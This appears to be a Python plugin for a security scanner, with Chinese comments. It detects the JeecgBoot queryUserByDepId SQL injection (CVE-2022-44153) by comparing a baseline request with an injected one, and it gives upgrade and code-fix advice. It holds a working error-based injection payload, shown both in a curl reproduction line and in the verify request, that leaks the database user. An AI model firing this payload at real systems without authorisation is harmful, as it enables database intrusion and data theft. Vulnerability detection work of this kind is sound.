# JeecgBoot SQL 注入（CVE-2022-44153 家族）：/sys/user/queryUserByDepId depId 参数报错注入
# 存在性验证：depId 注入单引号 + 报错函数，与基线请求差分比对，仅强报错特征命中才确认
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.matcher import match_sql_error
from lib.reporter import emit
from plugins.base import PluginBase


class JeecgSqlInjectQueryUserPlugin(PluginBase):
    name = "JeecgBoot queryUserByDepId SQL注入"
    cve = "CVE-2022-44153"
    severity = "high"
    category = "vuln"
    description = "JeecgBoot /sys/user/queryUserByDepId 的 depId 参数存在报错型 SQL 注入"
    fix = "升级 JeecgBoot 至 3.4.4+；对 depId 参数做参数化查询"
    fix_detail = (
        "【升级方案】升级至 JeecgBoot 3.4.4+（修复 queryUserByDepId 注入）\n"
        "【代码修复】SysUserController.queryUserByDepId 改用 MyBatis 参数绑定：#{depId}\n"
        "【WAF 规则】拦截 depId 参数含 extractvalue/updatexml/单引号+注释符的请求\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3"
    )
    reproduce = (
        'curl "http://target/jeecg-boot/sys/user/queryUserByDepId?depId='
        "1'%20and%20extractvalue(1,concat(0x7e,user()))--\"\n"
        "# 预期响应：错误信息含 extractvalue 与 SQL 报错关键字（XPATH syntax error 等）"
    )
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    vuln_type = "sqli"
    supports_waf_bypass = True

    def verify(self, target, session):
        """检测 /sys/user/queryUserByDepId 的 depId 参数是否存在报错型 SQL 注入。

        @param target: 目标站点根 URL
        @param session: 复用的 HTTP 会话
        @return: ScanResult —— 命中 CONFIRMED；未命中 SAFE；网络异常 UNKNOWN
        """
        url = join_url(
            target,
            # %20 为 URL 编码空格；末尾 -- 注释原 SQL 尾部，使 extractvalue 报错落点可控
            "/jeecg-boot/sys/user/queryUserByDepId?depId=1'%20and%20extractvalue(1,concat(0x7e,user()))--",
        )
        # 基线对照：同一接口仅把 depId 换成无害值。
        # 目的：区分「目标常驻报错文案」与「注入载荷被求值后产生的报错」。
        control_url = join_url(target, "/jeecg-boot/sys/user/queryUserByDepId?depId=1")
        try:
            inject_text = session.get(url).text or ""
            control_text = session.get(control_url).text or ""
        except Exception as e:
            # 网络异常归 UNKNOWN：测不到 ≠ 安全，避免漏报
            emit(no("JeecgBoot queryUserByDepId SQL注入（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
        # 判定（加固版·差分法）：
        #   历史缺陷：原判据 match_positive(text, ["extractvalue","xpath","updatexml","syntax error"])
        #   直接在整段响应体上匹配泛用 token —— 载荷本身含 extractvalue(1,... 字面量，
        #   任何回显请求参数的页面（WAF 拦截页/框架调试页）都会「自证命中」，属典型误报。
        #   现要求：响应含强 SQL 报错特征（lib.matcher.match_sql_error）、基线不含该特征、且无载荷回显。
        inj_strong = match_sql_error(inject_text)
        ctl_strong = match_sql_error(control_text)
        # 载荷回显特征：出现即说明请求被原样回显（WAF 拦截页 / 框架调试页）
        reflected = "extractvalue(1," in inject_text

        if inj_strong and not ctl_strong:
            emit(ok("存在 JeecgBoot queryUserByDepId SQL注入"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="响应含强 SQL 报错特征（XPATH syntax error/extractvalue 求值），且基线请求无此特征",
                fix=self.fix,
                extra={"vuln_type": "sqli", "plugin_name": "jeecg_sqli_query_user"},
            )
        # 报错特征伴随载荷回显 → 无法区分注入成功与请求回显
        if inj_strong and reflected:
            emit(no("JeecgBoot queryUserByDepId SQL注入：存在载荷回显，无法归因"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=url,
                evidence="响应含 SQL 报错特征但同时回显了注入载荷原文，无法归因，需人工复核",
            )
        # 强特征在基线中同样出现 → 常驻文案，无法归因于注入
        if inj_strong and ctl_strong:
            emit(no("JeecgBoot queryUserByDepId SQL注入：基线已含报错文案，无法归因"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=url,
                evidence="基线请求与注入请求均含强 SQL 报错特征，疑似目标常驻内容，需人工复核",
            )
        emit(no("不存在 JeecgBoot queryUserByDepId SQL注入"))
        return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
